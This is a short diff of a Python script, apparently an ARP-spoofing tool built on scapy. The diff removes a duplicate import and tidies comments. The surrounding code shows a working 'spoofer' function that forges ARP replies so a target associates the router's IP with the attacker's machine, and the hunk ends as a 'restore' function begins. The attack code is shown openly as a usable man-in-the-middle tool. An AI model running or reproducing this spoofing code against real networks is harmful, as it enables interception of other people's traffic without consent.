@@ -1,6 +1,4 @@
 #!/usr/bin/env python
-import time
-
 import scapy.all as scapy
 import time
 import subprocess
@@ -31,11 +29,11 @@ def spoofer(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet,verbose=False) #sends the packet
-#op=1 means ARP request op=2 means ARP response
+#op=1 => ARP request op=2 => ARP response
 #pdst IPfield (target)
 #hwdst Macfield (target)
 #psrc SourceIp (router)
-#packet.show() shows packet conte
+#packet.show() shows packet contents
 
 def restore(dest_ip,src_ip):
     dest_mac = get_mac(dest_ip)
